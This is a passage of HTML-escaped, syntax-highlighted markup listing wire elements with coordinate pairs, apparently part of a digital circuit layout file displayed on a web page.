&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,580)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,600)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,600)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,600)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(400,180)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(400,210)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(400,180)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,180)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(400,490)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(400,510)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(400,490)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,490)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(400,570)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(400,590)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(400,590)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,590)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(410,510)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(410,520)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(410,510)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,510)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(410,560)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(410,570)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(410,570)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,570)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,130)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,150)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,130)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,130)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,190)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,220)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,190)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,190)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,600)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,610)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(430,140)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(430,150)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(430,150)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,150)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,130)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,140)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,210)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,220)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,220)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(480,220)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,460)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(590,460)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(460,130)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(590,130)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(480,120)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(480,220)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(580,350)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(590,350)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(590,130)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(590,190)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(590,190)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(630,190)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(590,270)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(590,350)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(590,350)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(590,460)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(670,190)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(710,190)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(690,200)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(690,230)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
